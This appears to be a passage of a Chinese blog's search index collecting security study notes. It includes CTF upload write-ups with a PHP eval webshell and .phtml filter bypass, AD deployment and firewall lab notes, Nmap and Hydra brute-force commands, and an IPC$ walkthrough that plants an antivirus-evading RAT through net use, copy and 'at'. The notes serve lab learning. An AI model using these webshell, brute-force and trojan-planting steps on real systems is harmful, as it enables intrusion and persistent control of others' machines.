src="/2021/02/06/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/3.2.1.1.png"></p><p><img src="/2021/02/06/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/3.2.1.2.png"></p>        <h4 id="3-2-2-上传shell-jpeg">          <a href="#3-2-2-上传shell-jpeg" class="heading-link"><i class="fas fa-link"></i></a>3.2.2 上传shell.jpeg</h4>      <p>shell.jpeg写入：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</span><br></pre></td></tr></table></div></figure><p>上传shell.jpeg</p><p><img src="/2021/02/06/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/3.2.2.png"></p>        <h3 id="4-蚁剑连接">          <a href="#4-蚁剑连接" class="heading-link"><i class="fas fa-link"></i></a>4. 蚁剑连接</h3>      <p>访问路径：<span class="exturl"><a class="exturl__link" href="http://de46a062-d501-47d2-b8e7-ff9901b722d5.node3.buuoj.cn/upload/b9e527fa0011b0a1d4a026c8d08892ca/shell.jpeg%EF%BC%88%E8%BF%99%E9%87%8C%E8%A6%81%E6%98%AF%E9%A6%96%E9%A1%B5%E7%9A%84URL%E5%8A%A0%E4%B8%8A%E5%90%8E%E6%9D%A5%E5%9B%9E%E6%98%BE%E6%B3%84%E9%9C%B2%E7%9A%84%E8%B7%AF%E5%BE%84%EF%BC%89">http://de46a062-d501-47d2-b8e7-ff9901b722d5.node3.buuoj.cn/upload/b9e527fa0011b0a1d4a026c8d08892ca/shell.jpeg（这里要是首页的URL加上后来回显泄露的路径）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><img src="/2021/02/06/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/4.1.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[极客大挑战 2019]Upload</title>
      <link href="2021/02/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload/"/>
      <url>2021/02/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="极客大挑战-2019-Upload">          <a href="#极客大挑战-2019-Upload" class="heading-link"><i class="fas fa-link"></i></a>[极客大挑战 2019]Upload</h1>      <p><img src="/2021/02/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload/1.png"></p><a id="more"></a><p>首先想到的就是用图片编辑器上传一句话木马图片</p><p><img src="/2021/02/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload/2.png"></p><p>然后上传，格式也正确，上传成功，但是当用蚁剑连的时候怎么都连不上，用 Burp 抓包一下发现很多乱码，看来这种方式也行不通，只能换一种方式</p><p>利用 上传 phtml 文件，文档中写上面的一句话木马，通过 Burp 拦截修改为 Content_type： image/jpeg 的格式</p><p><img src="/2021/02/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload/3.png"></p><p>修改后上传成功，利用蚁剑来连接</p><p>猜想后面的图片是存放在uploads/upload 中，一般来说可能是这些，发现 upload 可以连接</p><p><span class="exturl"><a class="exturl__link" href="http://12384bdf-eec0-49a8-b478-07b5b90a309d.node3.buuoj.cn/upload/shell.phtml">http://12384bdf-eec0-49a8-b478-07b5b90a309d.node3.buuoj.cn/upload/shell.phtml</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>密码 shell ，连接成功</p><p>打开进入虚拟终端，cat ﬂag 得到 ﬂag</p><p><img src="/2021/02/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload/4.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[ACTF2020 新生赛]Upload</title>
      <link href="2021/02/06/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/"/>
      <url>2021/02/06/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="ACTF2020-新生赛-Upload">          <a href="#ACTF2020-新生赛-Upload" class="heading-link"><i class="fas fa-link"></i></a>[ACTF2020 新生赛]Upload</h1>      <p>文件上传的题目</p><p><img src="/2021/02/06/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/1.png"></p><a id="more"></a><p>刚打开这个页面啥都没有，F12查看源码，看到了提示，发现触碰这个灯就会有上传文件的接口，上传<br>了一个 php 的文件，想着用 Burp 拦截修改的，结果它在选择文件要上传的时候就给了判断，所以，根<br>本来不及发送到 Burp 中</p><p><img src="/2021/02/06/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/2.png"></p><p>再查看一下源码看看咋回事（上上面一张图就有了源码）<br>POST 方式提交，submit提交就会执行 checkfile()函数，就不能先上传到Burp后判断吗?好歹让 Burp<br>也走个流程啊，。。。<br>与后台无瓜，就是前端过滤了，好吧，我还是把这个php 后缀改成jpg 格式吧，然后再在 Burp 修改<br>然后修改成 php 格式还是不行，额，还是和上面一题一样吧，改成 phtml 格式的，</p><p><img src="/2021/02/06/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/3.png"></p><p>嗯，蚁剑连接成功，虚拟终端，cat /flag，拿到 flag<br>好吧，以后不多想了，图片编辑器可能只运用于 DVWA，真正比赛没成功过一次，这个以后就不用试<br>了。<br>以后 文档格式除了 phtml ,PHP，Php，php3，php4，php5 ，php7，phps，pht都可以试一遍，都<br>是php 的拓展名。</p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域环境部署</title>
      <link href="2021/02/06/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
      <url>2021/02/06/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="域">          <a href="#域" class="heading-link"><i class="fas fa-link"></i></a>域</h1>              <h2 id="1-Domin">          <a href="#1-Domin" class="heading-link"><i class="fas fa-link"></i></a>1. Domin</h2>              <h2 id="2-内网环境">          <a href="#2-内网环境" class="heading-link"><i class="fas fa-link"></i></a>2. 内网环境</h2>              <h3 id="2-1-工作组：默认模式，人人平等">          <a href="#2-1-工作组：默认模式，人人平等" class="heading-link"><i class="fas fa-link"></i></a>2.1 工作组：默认模式，人人平等</h3>              <h3 id="2-2-域：人人不平等，集中管理，统一管理">          <a href="#2-2-域：人人不平等，集中管理，统一管理" class="heading-link"><i class="fas fa-link"></i></a>2.2 域：人人不平等，集中管理，统一管理</h3>      <a id="more"></a>        <h2 id="3-域的特点">          <a href="#3-域的特点" class="heading-link"><i class="fas fa-link"></i></a>3. 域的特点</h2>      <p>集中/统一管理</p>        <h2 id="4-域的组成">          <a href="#4-域的组成" class="heading-link"><i class="fas fa-link"></i></a>4. 域的组成</h2>              <h3 id="4-1-域控制器（DC，domin-controller">          <a href="#4-1-域控制器（DC，domin-controller" class="heading-link"><i class="fas fa-link"></i></a>4.1 域控制器（DC，domin controller)</h3>      <p>域控制服务器</p>        <h3 id="4-2-成员机（域成员）">          <a href="#4-2-成员机（域成员）" class="heading-link"><i class="fas fa-link"></i></a>4.2 成员机（域成员）</h3>              <h2 id="5-域的部署">          <a href="#5-域的部署" class="heading-link"><i class="fas fa-link"></i></a>5. 域的部署</h2>      <ol><li>安装域控制器–&gt;就生成了域环境</li><li>安装了活动目录–&gt;就生成了域控制器</li><li>活动目录：Active Directory = AD</li></ol>        <h2 id="6-活动目录">          <a href="#6-活动目录" class="heading-link"><i class="fas fa-link"></i></a>6. 活动目录</h2>      <ol><li>AD</li><li>特点：集中/统一管理</li></ol>        <h2 id="7-组策略GPO">          <a href="#7-组策略GPO" class="heading-link"><i class="fas fa-link"></i></a>7. 组策略GPO</h2>              <h2 id="8-部署安装活动目录">          <a href="#8-部署安装活动目录" class="heading-link"><i class="fas fa-link"></i></a>8. 部署安装活动目录</h2>      <ol><li><p>开启2008虚拟机，并桥接到vm2</p></li><li><p>配置静态IP</p><p>10.1.1.1/24</p></li><li><p>开始-&gt;运行-&gt;dcpromo(可安装和卸载域活动目录)</p></li><li><p>将本机服务器设为DNS服务器</p></li><li><p>新林中新建域</p></li><li><p>林功能级别设置为2003（如果不是低级别，以后设置就不能比它低）</p><p>域功能级别设置为2003（和上面同样的道理）</p></li><li><p>域的FQDN（sculptor.com）</p></li><li><p>设置目录服务还原密码@200816hy</p></li><li><p>勾选安装后重启</p></li><li><p>验证是否安装成功</p></li><li><p>登录域sculptor/Administrotor，DC的本地管理员升级为域管理员</p></li><li><p>验证AD是否安装成功：</p><p>1-计算机右键属性-&gt;所属域，</p><p>2-DNS服务器中是否自动创建sculptor.com区域文件</p><p>3-自动注册DC的域名解析记录</p><p>4-开始-&gt;管理工具-&gt;AD用户和计算机</p><p>​    computer：普通域成员机列表</p><p>​    Domin Controller：DC列表</p><p>​    users：域账户</p><p>5-新建普通域用户组</p><p>​    Users-&gt;新建用户-&gt;用户名：haoyuan.liu-&gt;密码：@200816hy</p></li><li><p>PC加入域</p><p>1-配置IP:10.1.1.2/24，并指向DNS:10.1.1.1</p><p>2-计算机右键属性-&gt;更改-&gt;加入sculptor.com域</p><p>3-重启加入域后，成功使用域用户登录成员机:haoyuan.liu</p></li><li><p>常见小问题</p><p>1）加入域不成功<br>   网络是不是不通！<br>   解析是否能成功解析！<br>   是否为DNS缓存问题<br>2）登入域不成功<br>如XP，已勾选登录域QF，不用再写qf\xiaofei.wen<br>3）域用户的权限<br>   建议将域用户加入到普通成员机的本地管理员组中</p><p><strong>本地管理员组</strong>：administrators<br><strong>域管理员组</strong>：Domain Admins</p></li><li><p>OU：组织单位<br>作用：用于归类域资源（域用户、域计算机、域组）</p><p>sculptor.com下新建组织单位（有logo图标的才是OU)</p><p>用户移动：右击-&gt;所以任务</p><p>用户电脑移动：computers中找到计算机进行移动</p><p><strong>将用户和计算机拉到同一部门下为了组策略设限是区别对待是限制用户还是计算机</strong></p></li><li><p>组策略：Group Policy = GPO<br>作用：通过组策略可以修改计算机的各种属性，如开始菜单、桌面背景、网络参数等。</p><p>重点：组策略在域中，是基于OU来下发的！！<br>组策略在域中下发后，用户的应用顺序是：LSDOU<br>在应用过程中，如果出现冲突，后应用的生效！</p><p><strong>正常情况下：LSDOU顺序</strong></p><p>上级OU：        桌面：aa      运行：删除</p><p>下级OU：        桌面：未配置  运行：不删除</p><p>下级OU用户结果：桌面：aa      运行：不删除</p><p><strong>下级OU设置了阻止继承：</strong></p><p>上级OU：         桌面：aa     运行：删除</p><p>下级OU：         桌面：未配置 运行：不删除</p><p>下级OU用户结果： 桌面：未配置 运行：不删除</p><p><strong>强制：</strong></p><p>锁死上级，不考虑下级</p></li></ol>        <h2 id="9-GPO练习">          <a href="#9-GPO练习" class="heading-link"><i class="fas fa-link"></i></a>9. GPO练习</h2>      <ol><li>在董事会部门设置GPO，并要求强制桌面背景，并验证</li><li>在董事会部门上级的ou上设置GPO,也进行强制桌面背景，并验证</li><li>在董事会部门上级的ou上设置GPO,强制删除运行菜单，并验证</li><li>练习阻止继承，并验证</li><li>练习向下强制，并验证</li><li>实现董事会的计算机无须按ctrl+alt+delete，并验证</li></ol>        <h2 id="10-部署环境">          <a href="#10-部署环境" class="heading-link"><i class="fas fa-link"></i></a>10. 部署环境</h2>      <p>1）win2008IP：10.1.1.1/24</p><p>2）win2003IP：10.1.1.2/24</p>        <h3 id="10-1-win2008部署DC-DNS">          <a href="#10-1-win2008部署DC-DNS" class="heading-link"><i class="fas fa-link"></i></a>10.1 win2008部署DC/DNS</h3>      <p>DNS要转发最近的公网：202.106.0.20</p><p>DNS中对准服务器右击-&gt;属性-&gt;转发器-&gt;编辑</p><p>如果不转发的话，所以员工都指向这个DC，不转发外网的话所有员工无法上网。</p>        <h3 id="10-2-win2003部署DHCP-IIS-文件共享">          <a href="#10-2-win2003部署DHCP-IIS-文件共享" class="heading-link"><i class="fas fa-link"></i></a>10.2 win2003部署DHCP/IIS/文件共享</h3>              <h4 id="10-2-1-DHCP部署">          <a href="#10-2-1-DHCP部署" class="heading-link"><i class="fas fa-link"></i></a>10.2.1 DHCP部署</h4>      <p>1-配置IP:10.1.1.2/24，并指向DNS:10.1.1.1</p><p>2-计算机右键属性-&gt;更改-&gt;加入sculptor.com域</p><p>驱动-&gt;安装可选windows组件-&gt;DHCP(网络服务)-&gt;IIS(应用程序服务器)-&gt;万维网服务</p><p>文件复制来源E盘</p><p>DHCP中：授权-&gt;新建作用域，DNS的IP：10.1.1.1/24（指向公司唯一dns服务器）</p>        <h4 id="10-2-2-文件共享部署">          <a href="#10-2-2-文件共享部署" class="heading-link"><i class="fas fa-link"></i></a>10.2.2 文件共享部署</h4>      <p>新建共享文件夹，属性：Everyone 完全控制，剩余的单独设置安全权限，添加Domain users</p><p>安全权限中取消父项继承</p>        <h4 id="10-2-3-IIS部署">          <a href="#10-2-3-IIS部署" class="heading-link"><i class="fas fa-link"></i></a>10.2.3 IIS部署</h4>      ]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透基本流程+漏洞利用之IPC$</title>
      <link href="2021/02/06/%E6%B8%97%E9%80%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BIPC/"/>
      <url>2021/02/06/%E6%B8%97%E9%80%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BIPC/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-渗透基本流程">          <a href="#1-渗透基本流程" class="heading-link"><i class="fas fa-link"></i></a>1. 渗透基本流程</h2>      <ol start="0"><li>授权</li><li>信息收集</li><li>扫描漏洞</li><li>漏洞利用</li><li>提权（shell环境、桌面环境、最高权限）<a id="more"></a></li><li>毁尸灭迹</li><li>留后门</li><li>渗透测试报告</li></ol>        <h2 id="2-漏洞利用之IPC">          <a href="#2-漏洞利用之IPC" class="heading-link"><i class="fas fa-link"></i></a>2. 漏洞利用之IPC$</h2>              <h3 id="2-0-实验准备">          <a href="#2-0-实验准备" class="heading-link"><i class="fas fa-link"></i></a>2.0 实验准备</h3>      <p>winXP 建立共享文件夹share</p><p>win server2003</p>        <h3 id="2-1-扫描端口">          <a href="#2-1-扫描端口" class="heading-link"><i class="fas fa-link"></i></a>2.1 扫描端口</h3>      <ol><li><p>利用软件Scanport 或则Nmap扫描端口</p><p>发现win server2003的445/139端口开放</p></li><li><p>手工测试端口号开放：<br>telnet IP地址 测试端口</p></li></ol>        <h3 id="2-2-漏洞利用之IPC">          <a href="#2-2-漏洞利用之IPC" class="heading-link"><i class="fas fa-link"></i></a>2.2 漏洞利用之IPC$</h3>      <p>进行暴力破解服务器密码：NTscan</p><p>NTscan解密的原理还是从字典库ping 目标ip加密码，所以我们做实验的时候NT_pass中要有服务器正确密码。</p><p>ConnetShare选择：IP$</p>        <h3 id="2-3-将远程盘映射到本地">          <a href="#2-3-将远程盘映射到本地" class="heading-link"><i class="fas fa-link"></i></a>2.3 将远程盘映射到本地</h3>      <p>winXP将win2003的共享文件夹映射到本地。</p><p>winXP dos命令中</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd:\\                                    #进入c盘中</span><br><span class="line">net use f: \\192.168.133.133\share 200816hy &#x2F;user:administrator                 #将win2003的共享文件夹映射到winXP本地f盘（f盘原本是不存在的，这里是虚拟的映射）（格式：net use f: \\192.168.133.133\share 密码 &#x2F;user:用户）</span><br><span class="line"></span><br><span class="line">net use f: &#x2F;del                          #删除映射的f盘</span><br><span class="line">或者：net use * &#x2F;del</span><br><span class="line">(可以把share改成其他路径，例如c$是c盘；ipc$是空链接，是整个电脑)</span><br></pre></td></tr></table></div></figure><p><strong>或者：</strong></p><p>winXP中”我的电脑“右击-&gt;映射网络驱动器</p>        <h3 id="2-4-映射后的后期查看">          <a href="#2-4-映射后的后期查看" class="heading-link"><i class="fas fa-link"></i></a>2.4 映射后的后期查看</h3>      <p>winXP dos命令：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd c:\\                   #进入c盘</span><br><span class="line">dir \\192.168.133.133\share         #查看服务器win2003的share文件夹</span><br><span class="line">dir \\192.168.133.133\c$            #查看服务器win2003的C盘</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>        <h3 id="2-5-生成木马">          <a href="#2-5-生成木马" class="heading-link"><i class="fas fa-link"></i></a>2.5 生成木马</h3>      <p>利用灰鸽子软件：鸽子牧民战天免杀专版0912</p><ol><li>配置服务程序</li><li>生成木马程序，移动到winXP的C盘</li></ol>        <h3 id="2-6-植入木马（留后门）">          <a href="#2-6-植入木马（留后门）" class="heading-link"><i class="fas fa-link"></i></a>2.6 植入木马（留后门）</h3>      <p>winXP dos命令</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd c:\\</span><br><span class="line">copy c:\Server.exe \\192.168.133.133\c$\windows\system32      #server.exe是木马程序，将木马程序复制到win2003的c:\\windows\system32下</span><br></pre></td></tr></table></div></figure>        <h3 id="2-7-设置计划任务自动执行木马：">          <a href="#2-7-设置计划任务自动执行木马：" class="heading-link"><i class="fas fa-link"></i></a>2.7 设置计划任务自动执行木马：</h3>      <p>winXP dos命令：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.133.133               #查看win2003的当下时间</span><br><span class="line">at \\192.168.133.133 xx:xx &quot;c:\windows\system32\Server.exe&quot;      #在xx:xx让win2003执行木马程序</span><br><span class="line">at \\192.168.133.133             #查看建立的作业状态</span><br><span class="line">at \\192.168.133.133 xx:xx &quot;c:\windows\system32\Server.exe&quot;</span><br></pre></td></tr></table></div></figure>        <h3 id="2-8-等待肉鸡上线">          <a href="#2-8-等待肉鸡上线" class="heading-link"><i class="fas fa-link"></i></a>2.8 等待肉鸡上线</h3>      ]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>扫描与爆破</title>
      <link href="2021/02/06/%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%88%86%E7%A0%B4/"/>
      <url>2021/02/06/%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="扫描">          <a href="#扫描" class="heading-link"><i class="fas fa-link"></i></a>扫描</h1>              <h2 id="0-前言">          <a href="#0-前言" class="heading-link"><i class="fas fa-link"></i></a>0. 前言</h2>      <p>手工与工具相结合</p><p>主机探测与端口扫描</p><p>主机测探是指确定目标主机是否存活。</p><a id="more"></a><p>端口扫描就是寻找在线主机所开放的端口，并且在端口上所运行的服务。甚至可以进一步确定目标主机操作系统类型和更详细的信息。</p>        <h2 id="1-常见端口号">          <a href="#1-常见端口号" class="heading-link"><i class="fas fa-link"></i></a>1. 常见端口号</h2>      <div class="table-container"><table><thead><tr><th>21</th><th>FTP</th><th>443</th><th>HTTPS</th></tr></thead><tbody><tr><td>22</td><td>SSH</td><td>1433</td><td>SQL Server</td></tr><tr><td>23</td><td>Telnet</td><td>1521</td><td>Oracle</td></tr><tr><td>25</td><td>SMTP</td><td>3306</td><td>MySQL</td></tr><tr><td>80</td><td>HTTP</td><td>3389</td><td>RDP</td></tr></tbody></table></div>        <h2 id="2-Nmap">          <a href="#2-Nmap" class="heading-link"><i class="fas fa-link"></i></a>2. Nmap</h2>              <h3 id="2-1-重要参数">          <a href="#2-1-重要参数" class="heading-link"><i class="fas fa-link"></i></a>2.1 重要参数</h3>      <div class="table-container"><table><thead><tr><th>-sP</th><th>ping 扫描</th></tr></thead><tbody><tr><td>-p</td><td>指定端口范围</td></tr><tr><td>-sV</td><td>服务版本探测</td></tr><tr><td>-O（大写）</td><td>启用操作系统探测</td></tr><tr><td>-A</td><td>全面扫描</td></tr><tr><td>-oN</td><td>保存txt</td></tr></tbody></table></div>        <h3 id="2-2-常用远程爆破命令">          <a href="#2-2-常用远程爆破命令" class="heading-link"><i class="fas fa-link"></i></a>2.2 常用远程爆破命令</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Nmap  -sP  192.168.133.1&#x2F;24      #扫描10.1.1.0整个网段</span><br><span class="line">Nmap  -p  21,23-25,3389 192.168.133.133 </span><br><span class="line">Nmap  -p  192.168.133.133 -sV    #扫描21,23的服务版本</span><br><span class="line">Nmap  -A  192.168.133.133         #全面扫描</span><br><span class="line">Nmap  -O  192.168.133.133        #扫描目标系统版本</span><br><span class="line">Namp  -p  21,23  192.168.133.133  -oN  e:\result.txt  #将查询结果保存到文档里   </span><br></pre></td></tr></table></div></figure>        <h2 id="3-Hydra（九头蛇）">          <a href="#3-Hydra（九头蛇）" class="heading-link"><i class="fas fa-link"></i></a>3. Hydra（九头蛇）</h2>              <h3 id="3-1-常用远程爆破命令">          <a href="#3-1-常用远程爆破命令" class="heading-link"><i class="fas fa-link"></i></a>3.1 常用远程爆破命令</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Hydra -l a -p 123 192.168.133.133 telnet</span><br><span class="line">Hydra -l a -P e:\pass.txt  192.168.133.133 telnet</span><br><span class="line">Hydra -l a -P e:\pass.txt  192.168.133.133 rdp</span><br><span class="line">Hydra -l a -P e:\pass.txt  192.168.133.133 smb</span><br><span class="line">Hydra -l a -P e:\pass.txt  192.168.133.133 ftp</span><br><span class="line">Hydra -l a -P e:\pass.txt  192.168.133.133 ssh</span><br><span class="line">Hydra -l a -P e:\pass.txt  192.168.133.133 mysql</span><br><span class="line"></span><br><span class="line">Hydra -L e:\user.txt -P e:\pass.txt  192.168.133.133 telnet</span><br><span class="line"></span><br><span class="line">#-l是指定用户名，-L是用户文件；-p是指定密码，-P是密码文件</span><br><span class="line">(这里也相当于跑字典)</span><br></pre></td></tr></table></div></figure>        <h2 id="4-本地爆破">          <a href="#4-本地爆破" class="heading-link"><i class="fas fa-link"></i></a>4. 本地爆破</h2>      <p>以下的程序都要以管理员的权限打开dos命令进行运行程序</p><p>getpass从本地内存中提取密码</p><p>Pwdump 提取sam中的HASH值，然后手工将hash值存储到hash.txt中</p><p>使用saminside软件进行hash暴力破解（前提saminside的字典库dic里有密码）</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Scan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>防火墙实验</title>
      <link href="2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/"/>
      <url>2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="1-实验一：验证区域隔离和策略编写">          <a href="#1-实验一：验证区域隔离和策略编写" class="heading-link"><i class="fas fa-link"></i></a>1. 实验一：验证区域隔离和策略编写</h1>      <p>地址：</p>        <h1 id="2-实验二：做源转换-SNAT">          <a href="#2-实验二：做源转换-SNAT" class="heading-link"><i class="fas fa-link"></i></a>2. 实验二：做源转换(SNAT)</h1>              <h2 id="2-0-前言">          <a href="#2-0-前言" class="heading-link"><i class="fas fa-link"></i></a>2.0 前言</h2>      <a id="more"></a><p>当外网服务器没有默认网关时，也就是外网服务器默认网关不指向防火墙的外网接口时，内网和DMZ区域就无法访问外网。</p><p>源转换的目的：让内部员工可以由内到外的上网。</p>        <h2 id="2-1-在实验一的基础上，将外网PC的网关去掉">          <a href="#2-1-在实验一的基础上，将外网PC的网关去掉" class="heading-link"><i class="fas fa-link"></i></a>2.1 在实验一的基础上，将外网PC的网关去掉</h2>      <p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/2.1.png"></p><p>win XP和win server2008都无法访问win server2003</p><p>因为外网无法给192或172这样的私有地址回包，相当于模拟了互联网</p>        <h2 id="2-2配置源地址转换（PAT）">          <a href="#2-2配置源地址转换（PAT）" class="heading-link"><i class="fas fa-link"></i></a>2.2配置源地址转换（PAT）</h2>      <p>找到NAT的出站–&gt;进行手动配置出站规则</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/2.2.1.png"></p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/2.2.2.png"></p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/2.2.3.png"></p><p>这样任何其他网络地址的PC经过防火墙外网出口就可以NAT转换，实现inside及dmz区域访问外网了。</p>        <h2 id="2-3-实验结果">          <a href="#2-3-实验结果" class="heading-link"><i class="fas fa-link"></i></a>2.3 实验结果</h2>      <p>对于win XP和win server2008：可以访问外网win server2003</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/2.3.1.png"></p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/2.3.2.png"></p><p>对于win server2003：还是无法访问win XP和win server2008</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/2.3.3.png"></p>        <h1 id="3-实验三：目标转换-DNAT">          <a href="#3-实验三：目标转换-DNAT" class="heading-link"><i class="fas fa-link"></i></a>3. 实验三：目标转换(DNAT)</h1>              <h2 id="3-0-前言">          <a href="#3-0-前言" class="heading-link"><i class="fas fa-link"></i></a>3.0 前言</h2>      <p>目标转换的目的：需要把内网服务器对外发布，内网端口映射到公网的接口，让外网的人通过访问公网IP来访问内网服务器。</p><p>要求：实验1，2的前提下</p>        <h2 id="3-1-把DMZ区域的win2008部署为web服务器，并发布出去">          <a href="#3-1-把DMZ区域的win2008部署为web服务器，并发布出去" class="heading-link"><i class="fas fa-link"></i></a>3.1 把DMZ区域的win2008部署为web服务器，并发布出去</h2>      <p>win server2008部署web服务器</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/3.1.1.png"></p><p>win XP可以访问DMZ区web服务</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/3.1.2.png"></p>        <h2 id="3-2-做DNAT">          <a href="#3-2-做DNAT" class="heading-link"><i class="fas fa-link"></i></a>3.2 做DNAT</h2>              <h3 id="3-2-1-win-server2008Web服务建立对外网开放IP地址">          <a href="#3-2-1-win-server2008Web服务建立对外网开放IP地址" class="heading-link"><i class="fas fa-link"></i></a>3.2.1 win server2008Web服务建立对外网开放IP地址</h3>      